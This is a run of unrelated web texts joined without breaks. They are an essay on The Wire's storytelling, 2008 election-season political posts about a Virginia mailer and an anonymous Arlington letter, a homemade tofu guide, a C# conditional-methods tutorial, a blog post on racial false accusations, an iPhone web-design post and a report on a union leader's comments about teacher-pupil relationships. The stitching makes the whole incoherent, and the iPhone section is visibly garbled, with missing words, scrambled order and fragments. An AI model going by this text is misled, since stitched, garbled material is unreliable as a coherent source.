First , understand that I ’m an unapologetic superfan of and evangelist for The Wire , which is David Simon ’s epic , 5 - season HBO drama about the life and work of a lot of very flawed characters in contemporary Baltimore .
This is neither the first nor last time that I ’ll quote Simon ’s excellent description of the show ’s theme , which is taken from his DVD commentary of the very first scene of s01e01 :
[ The Wire is ] really about the American city , and about how we live together .
It ’s about how institutions have an effect on individuals , and how … whether you ’re a cop , a longshoreman , a drug dealer , a politician , a judge [ or ] lawyer , you are ultimately compromised and must contend with whatever institution you ’ve committed to .
Much has been written about the dense , literary quality of the show ( read Kottke for context and great links ) , so it may not surprise you to learn I ’m one of the many people who consider
The Wire to be the best series that ’s ever appeared on television ; my wife and I have watched the first ( and , in my opinion , best ) four seasons at least three times .
Yeah , that ’s a plug for you to give The Wire a chance , but it ’s not exactly my point .
Ok .
So , why The Wire ?
My point is that one big reason why The Wire was so good is its endlessly satisfying story arc , which is composed of many smaller , complementary arcs inside the big arc .
That ’s where a good story becomes a much more engrossing narrative that ’s ultimately about more than itself .
Like any creative work that connects with the people who enjoy it , The Wire tells a story .
And , to some extent , every story is about change .
Something happened .
Or something is going to happen .
Or something that everybody expected to happen has n’t happened .
But , it ’s a change , and it ’s having an impact on the lives of people we care about .
Correct me if I ’m wrong , but that ’s basically the bones and teeth of every story from Adam & Eve through Harold & Kumar .
Something changed , and now people have to deal .
How that dealing spins out over the life of a project , how the story is told , and what the story says about the world are the sorts of questions we ’re only encouraged to ask about Big Important
Things like very old books and Bergman films .
Which , of course , is bullshit .
There ’s no reason you ca n’t look at the lifetime of any good piece of story - telling — and , yes , why not , let ’s say that could include blogs , Twitter accounts , and Flickr streams — and be able to see what the change is .
Yes : if it ’s any good , I can look at one page or one photo or one 140 - character post and enjoy it for its value as one independent thing in the world .
But over time , all those potentially thousands of pieces can and do snap together , often without our even realizing it .
The question is , what story is it that we ’re telling ?
What is the arc ?
And , that ’s where I look to an example of middlebrow culture that falls somewhere between Bergman ’s Death playing chess with Man on a beach and Scoble ’s latest shaky video of a guy who likes golf speaking in press releases .
But ,
The Wire is a piece of popular culture that beautifully illustrates how satisfying all those seemingly unrelated pieces of an arc can be — and how much richer they each become when the audience is engaged , challenged , and rewarded by the effort of giving the work 100 % of their attention .
Of course , it also helps if the creator is talented , tries really hard , and does n’t treat the audience like a bunch of bored imbeciles .
But , I digress .
Like any story , The Wire has characters , settings , and things that happen over time .
Example ?
Let ’s start with a single , one - minute scene from s01e05 — an episode called “ The Pager , ” that ’s from right around the time when the series really started cooking .
Which , not coincidentally , was also when the intersecting arcs started to reveal themselves .
The Scene
Meet Jimmy McNulty .
Jimmy ’s a talented , politically deaf , pain - in - the - ass homicide detective and drunk who ’s estranged from the mother of the two children he adores .
One night , in the shitty little apartment he ’s recently moved into , Jimmy ’s too wasted on cheap scotch to properly assemble the Ikea furniture that he bought for his kids ’ imminent visit .
Jimmy is a mess , because he ’s dealing with change .
In his own inimitable way .
But , see , you do n’t really even need to know all this to just enjoy the scene .
( Please watch from 0:09 - 1:25 )
One small scene of a guy who ’s drunk and a little careless .
There ’s loud music playing in the next apartment .
He has to make a few trips to get all of the stuff he bought into one room ( bet he ’s in a walk - up apartment , right ? ) .
Jimmy ’s useless tonight , clearly more focused on the bottle than on assembling the parts of his new SÜLI .
Here ’s a middle - aged man whose bedroom contains a green plastic lawn chair .
Plus , the whole sorry scene is grimly lit by a single high - wattage desk lamp — reminiscent of the unforgiving light flooding the interrogation rooms that Jimmy and his partner , Bunk , work every day .
Painful already , right ?
So , that ’s just one very small bit of character , setting , and thing - that - happens .
While it ’s certainly not a story , in and of itself , it ’s still an entertaining , well - made scene to watch .
Not as famous as Jimmy and Bunk ’s deservedly best - known scene from the previous episode ( warning : very NSFW ) , but you get the idea .
You can already tell a few things about this show .
It ’s well photographed , the set is painfully realistic , and the man dealing with change seems convincingly Baltimorean and drunk ( although the actor portraying him is stunningly British and , to my knowledge , mostly sober ) .
Even if you have no idea what else happens on the other dozens of hours of this series , past and future , you could watch this one - minute scene and think , “ yeah , that ’s pretty good . ”
The Episode
But , if you were able to watch the whole episode — and it ’s a good one — you ’d see an atypically intense and complex police drama about cops in an understaffed bureaucracy trying to gather string about a case that seems impossible to crack .
You ’d see that some of the cops are brilliant ( “ Natural PO - lice ” ) , some are dedicated , a couple are intoxicated by brutality , and a memorable pair with a Gaelic pun for a name are hilariously useless and corrupt .
None is perfect , but none is without his or her interesting and redeeming qualities .
End to end , it ’s a very colorful bunch .
Same goes for the dealers and drug kingpins , who are struggling with their own related set of problems around bureaucracy , trust , and continuity inside a crumbling system .
Theirs is a mature but increasingly vulnerable criminal enterprise that ’s being menaced and robbed at will by a dangerous and unforgettable outsider with surprising tastes , ethics , and style .
Along the way you ’d see a lot of beautifully shot scenes that show ( without telling ) why these people are so desperate .
Plus you ’d be introduced to secondary characters who are anything but stage dressing , such as a junkie informant who ’s inked and filled - in with the complex texture of a Mercutio or a Fagin .
So , basically , if you gave this episode from June of 2002 about an hour of your time , and it was the only thing you ever saw of The Wire , you ’d probably walk away thinking , “ Wow , I did n’t understand almost any of that , but it was really interesting and well made .
This looks like a great show that you have to actually watch and think about . ”
But , here ’s where it gets really good , and where we start to see a bigger arc that may not have been clear before .
The Season
Indeed , if you watched that whole first season of The Wire , you ’d find yourself rewarded with a storyline — an arc — that I will not spoil for you .
But , you ’d start to see that almost every character you meet ends up having some effect on at least a handful of other characters — even if they never knew the others existed .
The decisions that people make early in the season have resonance throughout the story that plays out in unexpected ways .
And the change that describes the generic arc of that first season ( Antihero cops try to take down an antihero Baltimore drug crew ) ends up telling a much deeper story than any typical police procedural that I ’m familiar with .
Even in one season , we ’re seeing a story that ’s closer to Dickens or Zola than any styrofoam plate full of Law & Order .
This is nothing short of a Greek Tragedy about broken people trying to stay alive in a broken system .
Nobody ’s perfect , and everybody is fucked in one way or another .
In my opinion , it ’s a breathtaking set of 13 episodes .
And if those hour - long TV shows were all you ever watched : again , you ’d have enjoyed a real treat .
But there ’s a lot more story , more change , and still more to the arc .
The Series
Finally , if you watched all five seasons of The Wire , you ’d see a lot more going on than you imagined from one season , one episode — let alone one short scene of a drunk cop trying to build children ’s furniture by lamp light .
You ’d see each successive season turning to a different broken and dying institution : unions , government , public education , and print media , respectively .
You ’d see the same themes , and characters , and mistakes , and hopes , and horrible consequences brought back to life in different ways .
Stuff that happened before still means something ; possibly even more than you ’d first realized .
This is a show that uses previous story arcs to deepen and expand on current stories .
It uses things you ’d never noticed from previous viewings as the centerpiece for a whole new story .
It suggests grace notes that are barely audible unless you ’ve been listening carefully for a very long time .
In sum , The Wire pays back the attention you invest in it like few pieces of art created in my lifetime .
It ’s vicious about telling every letter of the story with muscular precision — even when it chooses to do so at pace many would consider pointlessly deliberate : “ dull . ”
And , because the story rarely stops to explain what ’s happening for the folks who just wandered in from the first segment of Family Feud , it demands that you bring the same care and thought to watching the show that its creators brought to making it .
Thinking , on both ends of the art .
That is engagement .
Like great literature , yes , you can return and enjoy this series on many levels and based on whatever you have to bring to it at a given time .
It ’s not only smarter than anything else that I ’ve seen on TV , it ’s also smarter than I am .
Which I love .
Arcs Matter Because Writing Matters
I doubt that I ’ll ever make anything one - tenth as intelligent , thoughtful , and engaging as The Wire , and , in all likelihood , neither will you .
But , again , that ’s not the point .
The inspiration you need to take away from this is the idea that every scene matters to some arc .
Even the one minute with the drunk furniture assembly .
Whether your given “ scene ” is in a screenplay , or an Excel spreadsheet , or the Tweet that you ’re about to type about your flight delay : it matters .
It all matters .
Like I said in the talk where I first brought up this thought about The Wire ( video and slides of which below ) , if you think what you write about or otherwise choose to make does n’t matter , talk to Stephen King .
He started writing a book I adore before he nearly died , then finished it in excruciating pain after it turned out he was still barely alive , let alone whole .
The story he tells about what happened in - between may change your mind about whether this stuff is worth caring about .
Just understand : it matters to the people who follow your arc and it really ought to matter to you — long before some idiot with a rottweiler hits you with his giant van .
There ’s already one arc that you began the minute you made something , called it “ done , ” then put it someplace where people could see it .
How that very , very large story gets told may be too late for you to completely control .
Sorry , but that — as Omar would say — is all in the game .
But you very much do have the power to design the arcs you make , starting today .
And even if you have n’t figured out how your final episode ends , consider how the pieces you want to lay down might fit together .
And how the string that you gather might crack a case you had n’t expected .
Who do you want to delight ?
Who do you pray gets your references ?
Who will you flatly refuse to explain your backstory to ?
What ’s the one goddamned thing that only you can make today — and what arc might it fit into downstream ?
Which “ average reader ” are you prepared to find the courage to tell : “ Fuck you . ”
Above all : whose attention will you reward with the best thing you can possibly make today ?
Good .
Now go , and reward the shit out of them .

Absentee Ballot Request Form Seems to Compare the Democratic Presidential Nominee to Ahmadinijead , Kim Jong - Il , Putin , Chavez
' America Must Look Evil in the Eye' Printed Over Photo of Eyes Some Believe to be Obama's ...
Brad Friedman Byon
10/15/2008 , 10:03 am PT
Last week we reported that voters in one New York county were receiving absentee ballots with " Barack OSAMA " listed as the Democratic Presidential candidate running against John McCain .
This week , the beat goes on in Virginia , but in this case , it 's not a typo ( as the officials in NY claimed about their " Osama " ballots . )
The Republican Party of Virginia has sent absentee ballot request mailers to voters in the state , seeming to compare Barack Obama to Iran 's Mahmoud Ahmadinijead , North Korea 's Kim Jong - Il , Russia 's Vladimir Putin , and Venezuela 's Hugo Chavez .
" In today 's dangerous world , appeasement is not a foreign policy , " declares the outside of the mailer from the Republican Party of Virginia , followed by photographs of the four leaders and the text " America must face the threat of terror head - on " on the inside .
On the back of the envelope used to send in the voter 's absentee ballot request is a photo of what some Virginia voters , understandably , believe to be Obama 's eyes , with the words " America must look evil in the eye and never flinch . "
The complete mailer , with more of the pages and images than we show below , can be downloaded here as a PDF .
Decide for yourself , and note the additional graphic , now added as an update , comparing Osama to Obama ( and calling for the latter to be waterboarded ) as found on the Sacramento County , CA Republican Party 's website ...
Outside envelope ...
Inside the mailer ...
Back of the return envelope , as paid for by the Republican Party of Virginia ...
UPDATE : Some readers have written to suggest the eyes in the photo are not Barack Obama 's but those of Osama bin Laden .
You decide .
We 've changed the text above to reflect the possibility .
We 'd agree with commenter " bvac " who notes " I suspect that was intential on their part . "
Indeed , though the country's of the other leaders and dictators mentioned are named , neither Osama nor Obama are referred to directly in the mailer .
Along the same lines as the mailer above --- if , um , a bit less subtle --- comes the following graphic , as posted on the Sacramento County , CA Republican Party website , before they were forced to remove it , according to Sacramento Bee .
( Hat - tip " Blue Texan " at firedoglake ) ...
A screengrab of the page , which included some other interesting graphics is right here .
Classy folks .
Though they 've removed the graphic above , the Sacramento GOP site still features a phony e-mail about Obama and flag pins on it's front page , according to RAW STORY .
FURTHER UPDATE : " Jazz From Hell " picks up on this report , and notes , in part :
The The back of the envelope features a pic ( above the words " AMERICA MUST LOOK EVIL / IN THE EYE / AND NEVER FLINCH " ) that Brad says is Obama , which ties in with the reference to the " Democrats who want to control Washington " line inside the mailer , and would also be a natural deduction given the mailer 's design color ... brown , like Obama 's skin such as in this photo However , that 's not Obama .
It 's Osama bin Laden .
Notice how the original photo has been tinted a la the infamous O.J. Simpson photo on the cover of Time .
I showed the image to a colleague of mine who also thought it was Obama at first , no doubt overtly influenced by the sepia tint .
By his and Brad's -- and surely the intended recipients '-- erroneous IDs , a subconscious connection is made , which is exactly what is intended .
Happy World Vegetarian Day !
I never thought tofu had a flavor until a few years ago when I first made my own .
Up until then , I thought of it as a blank slate , something to suck up the flavors of whatever it was cooked with .
But the first time I made my own tofu I discovered that though it also has a mild taste , it ’s somehow creamier , richer , and better - tasting than packaged tofu .
Making tofu is really not as difficult as you might think , especially if you use a soymilk maker to make the soymilk first .
The soymilk machine heats the milk to just the right temperature ; from there you need only to mix in a coagulant , which causes the soymilk to curdle , and pour the curds into a cheesecloth - lined container that has holes punched in it to allow the whey to drain off .
You can even make tofu in a strainer or colander , if you ’re not a stickler about having a rectangular block of tofu .
With food prices so high , I ’ve been trying to save money anywhere I can , and making my own soymilk and tofu make a big difference in my weekly grocery bill .
I buy organic soybeans for $ 1.19 a pound at my local natural food store .
From that pound of beans , I can make six 1.5 - liter batches of soymilk or three 8 - ounce batches of tofu .
That ’s the equivalent of 9 of those aseptic boxes of soymilk for $ 1.19 !
Besides the obvious savings , making my own soymilk and tofu reduces waste and is better for the environment because there are no packages to throw away .
I keep my homemade soymilk in reusable glass pitchers similar to these ; my homemade tofu gets used so quickly that there ’s no need to store it in anything other than the press I use to make it .
I ’d like to show you the steps I go through when making tofu , but this is n’t really a recipe .
If you ’d like more info about the process –particularly for making tofu without a soymilk machine –there are lots of websites that give you more of the nitty gritty details .
Check the end of this post for a couple of links .
I begin by making soymilk with twice the usual amount of soybeans and the minimal amount of water .
The night before , I start the soybeans soaking in enough water to cover by a couple of inches .
In the morning , I drain and rinse the beans well .
If I ’m making soymilk , I often remove the beans ’ skins by rubbing them between my fingers in a pan of water , but I skip this step if I ’m making tofu .
In the new filterless SoyQuick , the beans and water go straight into the bottom of the machine together .
I add water to the lower line and then put in the beans and press the “ Soymilk ” button .
The machine grinds the soybeans while cooking them .
Once the machine beeps and the soymilk is ready , I pour the soymilk through the strainer into the transfer jug ( both included with the machine ) .
The okara ( soy pulp ) collects in the strainer , and I set it aside to use later .
If I were making soymilk , I could either stop here or strain the soymilk one more time through cheesecloth as I ’m transferring it into the glass container I store it in .
But since I ’m making tofu , I add a packet of coagulant to the soymilk in the transfer jug and cover the top with a plate to rest for about 20 minutes .
I used the SoyQuick brand coagulant ( magnesium chloride ) , but you can also buy nigari and gypsum to use as coagulants .
After about 20 minutes I check to see that the soymilk has coagulated and separated into curds and whey .
I pour it back through the strainer , which I set over a bowl to catch the whey .
( I use the whey to water my plants ; it contains nutrients that are beneficial to them . )
Once the curds are all in the strainer , I pour them into the cheesecloth - lined tofu press , which I ’ve set in a colander inside a bowl .
When the curds are all in the cheesecloth , I fold up all sides of the cloth , making a neat package .
I put the cover onto the tofu press and gently press down to remove the remaining whey .
To make it extra firm , I put a weight , such as a large can of tomatoes , on top of the press and leave it for about 15 minutes .
When it ’s finished pressing , I leave the tofu in the press and put it into the refrigerator .
After a couple of hours in the refrigerator , I unwrap the tofu and it is ready to use .
If I do n’t plan to use it that same day , I put it into a container and cover it with water to keep up to three days .
But fresh tofu tastes best that same day , so I rarely store it overnight .
Freshly made tofu has such a great taste that I like to prepare it in simple ways with few ingredients to hide its taste .
In my next post I ’ll show you what I did with this batch of tofu .
Some Questions I ’ve Been Asked about Homemade Soymilk and Tofu :
I only like Silk brand soymilk .
Does homemade soymilk taste like Silk ?
In a word , no .
Homemade soymilk does n’t really taste like any of the brands you buy in the store , and it can take a little getting used to .
Some people describe its taste as “ beany . ”
But there are a few things you can do to lessen the beany taste .
Okay , so what can you do to get rid of the beany taste ?
For one , remove the bean skins .
That ’s not as hard as it sounds , although it does make soymilk making a little more tedious .
After the soybeans have soaked for at least 8 hours , drain and rinse them , put them in a large bowl , and fill the bowl with water .
Rub the beans between your fingers to remove the skins .
When the skins float away from the beans , scoop them up and discard them .
You can also add grains to your soymilk to lessen the beany taste .
I ’ve only used oatmeal , but other people include rice and other grains .
Personally , I add 3 tablespoons of rolled oats ( regular Quaker oatmeal ) to the machine along with the soybeans ; it makes the milk thicker and less likely to separate ( but do n’t add it if you ’re making tofu ) .
Finally , I find that adding sweetener and salt make the milk taste a lot more like packaged soymilk .
For vanilla soymilk , I add 2 to 3 tablespoons of agave nectar and 1/4 teaspoon of salt after the final straining .
( To make vanilla soymilk , I break up two vanilla beans and add them along with the soybeans ; unfortunately , this creates vanilla okara , which means I have to make cookies .
Oh , well ! )
If you make soymilk at home , are n’t you missing out on the vitamins and minerals that are added to the packaged products ?
I figure it this way :
Those nutrients are just supplements that someone else has added .
I think my family and I are better off drinking freshly made soymilk , without thickeners and preservatives , and taking our own supplements , such as calcium and vitamin B - 12 .
I ’m actually happier buying vitamins and minerals in pill form because I can get them from a source that I trust to be vegan .

. NET 1.1+ . NET 1.1+ C# Conditional Methods by Richard Carr , published at http://www.blackwasp.co.uk/ConditionalMethods.aspx
Applications developed using C# and the .NET framework can include conditional methods .
These methods are called only when specified compiler symbols have been defined .
This makes them ideal for code used for tracing and debugging purposes .
What are Conditional Methods ?
A condition method is a method that is decorated with the Conditional attribute and the name of a compiler symbol .
If the specified compiler symbol has been defined , the method will be called when the code is executed .
If the identifier is not defined , any calls to the method will be stripped from the compiled assemblies .
The most common uses of conditional methods are for tracing and debugging .
In these cases , the conditional method is usually linked to the DEBUG symbol , which is automatically included for assemblies that are compiled in debug mode but excluded from release mode builds .
Code that outputs trace information can then be included in the conditional methods , which will not be called in the final production system .
Conditional methods provide similar benefits to code that is excluded using the # if compiler directive .
However , there is a very important difference between the two methods .
If a section of code is surrounded by #if and #endif compiler directives , this code will not be included in the build unless the specified symbol is defined .
With a conditional method , the method is always compiled into the final program .
If the specified identifier is not present the method is still included in the final assembly but any calls to that method are not .
This key difference has benefits and drawbacks .
The obvious drawback is that the compiled assembly will be larger than if the conditional method were not included .
The main benefit is that the assembly can be shared between programs and libraries .
Each of these may be compiled with different compiler symbols defined .
This means that a single assembly can behave differently according to the program calling it .
Another benefit is that the main code of the program is seen by some as more elegant without the #if and #endif conditions .
Conditional Attribute
The Conditional attribute can be applied to methods that have a return type of void .
The attribute requires a single parameter , which is a string containing the name of the compiler symbol that must be present in order for the method to be called .
The following code shows a method that is only called if the DEBUG symbol is present .
[ Conditional ( " DEBUG " ) ] public static void OutputTraceInformation ( ) { Console. WriteLine ( " Trace information " ) ; }
As the DEBUG identifier is specified in the attribute , we can test the conditional method by switching between debug and release modes .
Add the above method to a console application and then add the line below to the Main method .
When compiled in debug mode the program will output the message .
In release mode , the program will output nothing .
Race Injected Into Obama Vote
Created : October 06 , 2008 08:49 | Last updated : July 31 , 2020 00:00
Over the weekend , Sen . John McCain ’s brother referred to the Northern Virginia suburbs of Arlington and Alexandria as “ communist country , ” presumably for their traditional Democratic - leaning ways .
I do n’t cover politics at TWI , so I ’m not going to comment on the campaign strategy behind the remarks .
But I do live in Arlington , in a neighborhood called Clarendon .
And I can tell you a little bit about what ’s been going on here .
During the past few weeks , people who posted “ Obama for President ” signs in their yards in Clarendon and in the nearby neighborhood of Lyon Park received this letter .
Addressed to “ Dearest Neighbor , ” the letter informed them , in a tone meant to be friendly and helpful , that they should consider the possibility that they are supporting Obama to cover up for their own , hidden racism .
Here ’s the letter :
The neighborhood listserve lit up with people arguing over who could have been responsible for the letter , until the moderator shut the topic down .
No one knows for sure .
The letter itself has made it on to two anti-racism websites , and a site that chronicles voter suppression .
The Institute for Healing Racism posted a statement on its site disavowing anything to do with it .
In the meantime , life goes on as usual , here in the communist suburbs of Northern Virginia .
But that was n't enough because what he did was so horrible he had to pay dearly .
So they shot him in the head .
He stopped screaming as his lifeless body thumped on the ground .
They took him to a the river , weighed his body down with a heavy fan and discarded him like piece of nasty trash .
And just what was his crime ?
It 's simple .
Black boys have no business whistling and White women and should you dare challenge this unwritten law , prepare yourself .
After all , this was 1955 and there were certain times when just being black was a crime .
Whew - glad those days are over .
By the late 1980 's some 34 years later things are different .
Gone are the days of being so brutally murdered by mere mention of being annoyed .
These days when people commit ACTUAL crimes they ACTUALLY are brought to justice by the LAW and not some crazy case of vigilantism .
That 's why in New York City in 1989 , those horrible Black boys were actually arrested and convicted of actually raping a white woman .
After all , billionaire Donald Trump , for some reason took this case personally and spent more than 80 thousand dollars to put out ads calling for the death penalty saying " They should be forced to suffer . "
But he was n't alone .
Then Mayor Ed Koch called them " monsters " touting " I want them to be afraid . "
Fear that ghetto crime could spoil this sanctuary struck a powerful chord , especially among the rich and the elected .
Donald Trump , the real - estate magnate , would spend $ 85,000 on full - page ads calling for the death penalty in the jogger case : " They should be forced to suffer . . . , " Trump opined .
" I want them to be afraid . "
Mayor Ed Koch was often quoted calling the arrested boys " monsters " and complaining that juvenile laws were too soft .
Pete Hamill , looking back now , remembers a city on edge , maybe over the brink .
" Aside from the savagery of the rape and the beating itself , there was a sense that the city was unraveling , " he says .
" That young people fueled by crack and rage , and armed with guns , were out of control . "
http://cjrarchives.org/...
Turns out , those boys did n't rape anyone despite the media frenzied quotes of so - called " confessions " .
So what then was their crime ?
well , it could n't have been being Black at the wrong place at the wrong time because after all , it was 1989 .
And if things were better in 1989 , then they sure as hell were better 5 years later .
That was the year Susan Smith lost all sense of her " motherliness " and did the unthinkable .
For heinous reasons now known , after her dirty deed was done she decided it 's not enough that she could n't come to grips with her own inner hurt and pain , she needed to bring someone else in with her to share in her misery - better yet - take the brunt of her misery altogether .
So she decided to cast her hurt on that someone .
Any piece of trash would do ( as long as she could make it believable ) .
The light bulb went off in her head and it became all too clear ...
Police radios were abuzz .
" Be on the lookout for a Black male .
He 's driving a carjacked 1990 Mazda Protegé with 2 small children still inside .
This man may be armed and is considered very very dangerous .
Approach with caution "
The people in that small town in South Carolina and everywhere else in the nation for all that matters prayed that those 2 children could return home to their loving parents .
Nine days later she could take it no longer and confessed that it was she that mercilessly killed her own children by drowning them in the river both still strapped by seatbelt in the car .
And here we are Ms. Todd ( and press ) 13 years past the Smith horror , 53 years past Till and just when we think we are finally over this ominous fear of Black skin , Black culture , Black rage , or just being Black , we stand in admiration of a man who just might become the first Black President of the United States of America .
Despite the few bellowings of blowhards like Limbaugh erroneously attempting " his people " back to that fear , we think we are finally ready to accept and appreciate each others differences .
Then you come along , no doubt , knowing NOTHING or completely ( or conveniently ) forgetting about racial history in this country , and attempt to join El Rush - A - hole throwing the scourge of racial fears back into the American psyche .
Why Ms. Todd ( and press ) would you do such a thing ?
Do you really loathe Black people so much as did that mob in 1955 , as did Trump in 1989 , as did Smith 1995 , that you would care NOTHING about what would happen to a would - be- suspect .
What would happen to their lives and their family members should they have been falsely convicted of a crime they did n't commit or even a crime did n't happen ?
Did you have some sinister or grandiose plan to steal the election away from Obama by again using the always reliable fear card generated by racial hatred ?
or are you just without full faculties ?
How did you feel when you got that sympathy call from Mr McCain and Mrs Palin ?
Did you feel like you did something that you can be proud of ?
Whatever the reason , you should know that in this new millenium times are way too serious to be so careless , angry , evil , or whatever to want attention that badly that you can potentially affect the lives of real human beings who , like you , have hearts , have love in those hearts and want nothing more than love and be loved in return .

I bought an iPhone last week .
borrowed
do you have any games ?
My daughter pulled me into it , as usual .
I mean , for the longest time , I did n't even have a cell phone .
So for years daughtercell phones from every adult she could find , asking firstand then proceeding to explore every function the cell phone could offer .
That guy should talk about the iPhone .
When I finally broke down and got my own cell phone ( cheapest plan I could find , with a bare minimum of features ) , daughter managed to make the most of it .
And all was well — until recently , when iPhone buzz leaked into our home .
It started slowly — a drip - drip of possibility — quickly morphing into flash - flood of desire .
Apparently the daughter ( now 12 ) had seen the iPhone on T.V. , and did a google search on it .
( This is the real reason why you should not allow televisions and computers in your child 's bedroom . )
Soon she was watching Youtube iPhone demo videos — over and over .
And then she began to show them to me .
Over and over .
She told me about all the apps she 'd heard about .
At one point , watching an unrelated Steven Colbert rerun on TV , daughter said ( Apparently there were a few videos she missed . )
You 'll love our coverage ,
So one Saturday afternoon , I agreed to take my daughter to the AT&T store , just to LOOK at an iPhone ... touch one ... explore a little .
MISTAKE .
I should have duct - taped myself to the mast — and my wallet to my ass — because next thing I knew ( after daughter demoed it as expertly as if she 'd been using it all her life ) we were walking out of the store with a brand new iPhone 3G .
the AT&T salesman assured as he packed the phone into a bag , only for us to discover upon arriving home that we had no reception within a quarter mile of our house .
Dang !
now we have to move .
i Phone is different

fingertip navigation to zoom in on a site , use your thumb and forefinger to stretch it , to zoom out , use thumb and forefinger to pinch it ( aka multitouch navigation ) — awesome !
scroll , slide , tap interface items with your finger tip a light resting of your fingertip on a link works like a hover , while a finger - tap works like a mouse click typing is a bit awkward ... especially long URIs most navigation signals are given with finger taps drag and drop elements replaced with click to click
native application integration tap on an embedded Youtube video , and iPhone opens the Youtube application in landscape mode , and plays the video iPhone Safari auto - detects phone numbers on a web page , turns them into links — tap the link and it will offer to dial the number .
tap again to dial .
( this can be disabled ) addresses can be used to link to the map application
Design with iPhone in Mind
In the meantime , we brought our iPhone into the streets , where I explored its possibilities ( during the moments I was able to wrest it from my daughter ) .
For me , one of the most interesting things about the iPhone ( outside of beating my high score at Tap Tap ) was exploring the web — and I 'm not alone .
2008 studies show that between 85 and 95 % of iPhone owners regularly use the web ( as opposed to 13 % of mobile phone owners and 58 % of total smart - phone owners ) ( 1 2 ) .
So iPhone 's browser is definitely worth keeping in mind when building websites .
Keep it simple - KISS - to the limit !!!
detect iPhone with CSS , and deliver it optimized styles detect iPhone with a script , and send it to an optimized HTML page / site
From what I have gathered by reading the Apple iPhone Safari web developer docs , visiting different sites , and coding my own simple site with an iPhone in hand , there are three basic approaches to optimizing your site for the iPhone :
3. Detect iPhone , and send it to an optimized HTML site
So , working backwards , starting from most resource - intensive solution and moving toward the simplest :
The third method , detecting iPhone ( specifically ) with Javascript and sending it to a different HTML file , flies in the face of browser - independent coding and probably does not need to be employed by any site with a truly well - constructed front - end .
However , for certain high - traffic sites accessed regularly by folks on the go , especially those wit confusing administrative interfaces loaded with widgets , feeds , and negligibly useful applications , it makes sense to put some resources toward developing a clean , simple intuitive front - end for iPhone users .
Hello Facebook
Facebook 's iPhone interface is accessible from any browser at iphone.facebook.com .
The special iPhone login page , maximizes iPhone screen real estate by setting the viewport meta tag to 320 pixels wide ( the actual design is liquid ) .
From there , it is clear what your next step is , as a Facebook user ( Log in — or secondarily register , or view the regular Facebook site )
Once you are logged into Facebook on iPhone , you come to another iPhone - optimized page , with friend updates front and center , and four basic navigation tabs .
HTML , CSS , and Javascript are all optimized for the iPhone .
For me personally , Facebook is better on the iPhone , because that interface does the best job keeping the most dynamic ( and presumably , most used ) features front - and - center .
2. Detect iPhone with CSS , and deliver it an optimized style
Twitter has employed a similar strategy , which you can read about on , and visit from http://twitterforiphone.com/ and on Laughing Squid .
Twitter also offers a SSL login for mobile users .
Other than that , I 'm not certain whether a site as simple as Twitter truly needs a special iPhone interface .
handheld
i Phone ignoresCSS media - type , but if you need to serve iPhone a special stylesheet , Apple explains how to do so , using conditional CSS : 3 ) .
1. KISS it - to the limit !
This seems to be a relatively elegant solution that I imagine would come in for example , if your CSS design is image - heavy and you want to serve iPhone users a more streamlined CSS , or if you want to make iPhone - friendly adjustments to your layout .
Keep it simple , stupid
is the alpha , and the omega of website design .
Simple sites tend to be faster , more usable , and more degradable ( backwards , forwards , and sideways ) .
KISS is the technique I employed in my efforts to design an iPhone friendly site .
The site , 10 volt.org , is a simple WordPress blog set up for evolt 's 10 year anniversary .
I started building the site using iPhone viewer , and by the time I finished , I was viewing it on the iPhone .
I wanted to build a content - focused site , and I wanted to be done in a weekend , so it needed to be simple and easy for me , my users , and user - agents .
Columns and Blocks
The first thing I did in hopes of accommodating an iPhone was to change my blog theme ( darknight2.0 , a standard WordPress theme ) to a fully liquid layout .
I later realized that iPhone does fine even with fixed - width sites ( again , defaulting to 980 px view , unless instructed otherwise ) , especially CSS layouts that constrain and divide content areas reasonably .
But since I 've always loved liquid layouts , I kept it fluid .
I was able to use most of the viewport by keeping body margins small , while horizontally restraining the wrapper div on large monitors with theproperty .
After some exploration I found that my favorite sites on iPhone are those that offer narrow columns for large quantities of text , and small boxes for small chunks of content .
I totally loved perusing the front page of sites like alistapart.com and mandatemedia.com , where the iPhone could explore every box on the page , almost like using a magnifying glass to zoom into rooms in a dollhouse .
I later learned that not only are column and block layouts much easier to read on iPhone , they support iPhone navigation , too !
When a user double taps on a CSS block - level element , Safari will zoom to fit the element in the screen , and center it . (
3
viva suck !
For more in - depth reading ( text - heavy content ) , it 's important to me not to have to shift text back and forth from the beginning to end of text lines .
Columns need to be sufficiently narrow for text to be magnified to a readable level , while still fitting fully in the iPhone screen .
i Phoney : iPhone viewer for Mac developers
At some point it occurred to me that the the circa 1995 design of suck.com would be perfect for the iPhone .
I was not disappointed .
suck.com , currently being archived at its original location , is totally readable on iPhone !
You do n't even have to turn it sideways !
In fact , like Facebook , I found suck.com to be MORE readable on the iPhone than on a desktop — yet without creating an iPhone - only layout .
And , bonus !
suck.com is also the easiest URI to type into an iPhone .
Thanks to iPhone , I 've finally made it through an entire suck essay !

Teachers who have consensual sex with pupils should not face prosecution , says union
Child protection experts last night condemned a teachers ' leader for saying that staff who have affairs with pupils over 16 should escape prosecution .
Chris Keates , general secretary of the National Association of Schoolmasters Union of Women Teachers , said teachers should not face jail for having sex with pupils who are over the age of consent .
Her comments , due to be broadcast tonight , have outraged child protection and parenting experts who accused her of disregarding the protection of children .
Miss Keates said : ' There is a real anomaly in the law that we are concerned about .
' If a teacher has a relationship with a pupil at the school at which they teach - it could be an 18 - year - old pupil in the sixth form - then the teacher can be prosecuted and end up on the sex offenders ' register . '
Teachers who have sex with sixth form pupils are only guilty of an ' error of professional judgement ' and it is unfair to put them on the sex offenders ' register , she insists .
Affair : Dean Dainty , left , was 15 when he was seduced by dance teacher Nicola Prentice , right .
He says the affair , which resulted in her walking free from court having been handed a 12 - month suspended sentence , ruined his life
Miss Keates told the ITV Tonight programme : ' Clearly there has to be appropriate disciplinary sanctions in the school where a teacher works to make sure that inappropriate relationships do n’t develop , but it does seem a step too far - when there has been a consensual relationship - to put that person on a sex offenders ' register when in fact , they could have a perfectly legitimate relationship with an 18 - year - old still enrolled at another school . '
Her criticism of the abuse of trust law , contained in the Sexual Offences Act , which makes it illegal for teachers to have sexual relationships with children in their care , was condemned last night by child safety organisations .
Zoe Hilton , policy advisor at the NSPCC , said ' The law is very clear that if a teacher abuses his or her position of trust by forming a sexual relationship with a pupil they could be prosecuted and this remains the case even if the child gives their consent .
The law is , quite rightly , there to protect children . '
Author on parenting and children 's rights , Lynette Burrows said : ' Where is her moral compass ?
' Teachers who take advantage of a young girl or boy in their care should certainly face dismissal and prosecution .
